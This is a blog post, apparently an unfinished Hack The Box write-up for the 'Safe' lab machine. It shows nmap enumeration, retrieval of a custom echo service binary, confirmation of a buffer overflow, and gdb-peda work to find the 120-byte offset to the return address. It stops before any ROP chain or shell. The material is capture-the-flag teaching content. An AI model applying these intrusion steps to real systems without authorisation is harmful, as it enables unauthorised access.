---
layout: post
title: Safe
categories: [HTB Writeup, Safe]
tags: [RCE, ROP chain, enumeration, HTB]
fullview: false
comments: true
---

![Safe info card](/images/safe_card.png)

A 20 point box where the foothold requires a binary exploitation/ROP. However, it gets much easier from there and the ROP is fairly straight forward.  

So let's get started.

## TL;DR

* enumerate the box to find a service (with a custom binary) on port 1337
* Identify the buffer overlfow and create a ROP chain to gain a foothold
* from shell, locate a KeePass vault with images
* crack the KeePass vault using one of the image files to gain root

## Initial Enumeration

{% highlight Ada linenos %}
db-d2@kali:~/hack_the_box$ nmap -sC -sV -sT -o safe_map 10.10.10.147
Starting Nmap 7.80 ( https://nmap.org )
Nmap scan report for 10.10.10.147
Host is up (0.027s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)
|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)
|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.31 seconds
{% endhighlight %}

So we have http on 80 and ssh on 22. Let's check the http site

## Web Enumeration

![Safe http site](/images/safe_http.png)

Looks like the default apache page but let's inspect it anyway

![Safe http source](/images/safe_http_src.png)

So "myapp" is running on p1337 and it's available for download. Let's check out the service first

{% highlight C linenos %}
db-d2@kali:~/hack_the_box$ nc 10.10.10.147 1337
 21:05:13 up 27 min,  0 users,  load average: 0.00, 0.00, 0.00
hello

What do you want me to echo back? hello
{% endhighlight %}

Not much here, let's grab myapp and take a look

{% highlight Ada linenos %}
db-d2@kali:~/hack_the_box$ wget http://10.10.10.147/myapp
  http://10.10.10.147/myapp
Connecting to 10.10.10.147:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16592 (16K)
Saving to: ‘myapp’

myapp 100%[==============================================>]  16.20K  --.-KB/s  in 0.05s

db-d2@kali:~/hack_the_box$ sudo chmod +x myapp
[sudo] password for db-d2:

db-d2@kali:~/hack_the_box$ ./myapp
 21:43:47 up 58 min,  3 users,  load average: 0.01, 0.01, 0.00

What do you want me to echo back? bob
bob
{% endhighlight %}

## Myapp
Okay so we have a pretty basic app that starts off with uptime, 
takes input and echos it back. Let's see if we have a buffer overflow in here

{% highlight Ada linenos %}
What do you want me to echo back? yipyipyipyipyipyipyipyipyipyip...
...
Segmentation fault
{% endhighlight %}

And jackpot! Let's break it open in gdb and run checksec (btw, if you're not using [Peda](https://github.com/longld/peda) you should install it now)

{% highlight Ada linenos %}
Reading symbols from ./myapp...
(No debugging symbols found in ./myapp)
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
{% endhighlight %}

NS is enabled so I won't be able to just inject and execute shellcode. I'll have to build a ROP chain. Oh, darn...

First up, I need to find the offest so let's create a pattern

{% highlight Ada linenos %}
gdb-peda$ pattern create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHA...'
gdb-peda$

gdb-peda$ r
Starting program: /home/db-d2/hack_the_box/myapp
[Detaching after vfork from child process 775755]
 21:10:11 up 10 days, 24 min,  2 users,  load average: 0.00, 0.00, 0.00

What do you want me to echo back? AAA%AAsAABAA$AAnAACAA-AA...

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x0
RCX: 0x7ffff7ecfff3 (<__GI___libc_write+19>:	cmp    rax,0xfffffffffffff000)
RDX: 0x0
RSI: 0x4052a0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcA")
RDI: 0x7ffff7fa2670 --> 0x0
RBP: 0x41414e4141384141 ('AA8AANAA')
RSP: 0x7fffffffe448 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
RIP: 0x4011ac (<main+77>:	ret)
R8 : 0xc9
R9 : 0x0
R10: 0xfffffffffffff41f
R11: 0x246
R12: 0x401070 (<_start>:	xor    ebp,ebp)
R13: 0x0
R14: 0x0
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011a1 <main+66>:	call   0x401030 <puts@plt>
   0x4011a6 <main+71>:	mov    eax,0x0
   0x4011ab <main+76>:	leave
=> 0x4011ac <main+77>:	ret
   0x4011ad:	nop    DWORD PTR [rax]
   0x4011b0 <__libc_csu_init>:	push   r15
   0x4011b2 <__libc_csu_init+2>:	mov    r15,rdx
   0x4011b5 <__libc_csu_init+5>:	push   r14
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe448 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| 0x7fffffffe450 ("AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| 0x7fffffffe458 ("AAQAAmAARAAoAASAApAATAAqAAUAAAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| 0x7fffffffe460 ("RAAoAASAApAATAAqAAUAArAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0032| 0x7fffffffe468 ("ApAATAAqAAUAArAAVAAAAuAAXAAvAAYAAwAAZAAxAAyA")
0040| 0x7fffffffe470 ("AAUAArAAVAAtAAWAXAAvAAYAAwAAZAAxAAyA")
0048| 0x7fffffffe478 ("VAAtAAWAAuAvAAYAAwAAZAAxAAyA")
0056| 0x7fffffffe480 ("AuAAXAAAAwAAZAAxAAyA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004011ac in main ()
{% endhighlight %}

So we stopped on ret as it was trying to load the next stack item into the RIP. Awesome, let's own the RIP. I'll copy out "jAA9AAOA" and use it to locate the offset

{% highlight Ada linenos %}
gdb-peda$ pattern_offset jAA9AAOA
jAA9AAOA found at offset: 120
{% endhighlight %}

Now i'll create a new pattern with a size of 120 and throw in 8 junk chars at the end

{% highlight Ada linenos %}
gdb-peda$ pattern create 120
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAK
AAgAA6AALAAhAA7AAMAAiAA8AANAA'

gdb-peda$ r
Starting program: /home/db-d2/hack_the_box/myapp
[Detaching after vfork from child process 775918]
 22:25:55 up 10 days,  1:40,  2 users,  load average: 0.00, 0.00, 0.00

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x0
RCX: 0x7ffff7ecfff3 (<__GI___libc_write+19>:	cmp    rax,0xfffffffffffff000)
RDX: 0x0
RSI: 0x4052a0 ("AAAAAsAABAA$AAnAACAAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAhelothere\n")
RDI: 0x7ffff7fa2670 --> 0x0
RBP: 0x41414e4141384141 ('AA8AANAA')
RSP: 0x7fffffffe448 ("helothere")
RIP: 0x4011ac (<main+77>:	ret)
R8 : 0x82
R9 : 0x0
R10: 0xfffffffffffff41f
R11: 0x246
R12: 0x401070 (<_start>:	xor    ebp,ebp)
R13: 0x0
R14: 0x0
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011a1 <main+66>:	call   0x401030 <puts@plt>
   0x4011a6 <main+71>:	mov    eax,0x0
   0x4011ab <main+76>:	leave
=> 0x4011ac <main+77>:	ret
   0x4011ad:	nop    DWORD PTR [rax]
   0x4011b0 <__libc_csu_init>:	push   r15
   0x4011b2 <__libc_csu_init+2>:	mov    r15,rdx
   0x4011b5 <__libc_csu_init+5>:	push   r14
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe448 ("helothere")
0008| 0x7fffffffe450 --> 0x7fffffff0065 --> 0x0
0016| 0x7fffffffe458 --> 0x100000000
0024| 0x7fffffffe460 --> 0x40115f (<main>:	push   rbp)
0032| 0x7fffffffe468 --> 0x7ffff7e077d9 (<init_cacheinfo+297>:	mov    rbp,rax)
0040| 0x7fffffffe470 --> 0x0
0048| 0x7fffffffe478 --> 0x35136ec0411f0d74
0056| 0x7fffffffe480 --> 0x401070 (<_start>:	xor    ebp,ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004011ac in main ()
{% endhightlight %}

Cont...

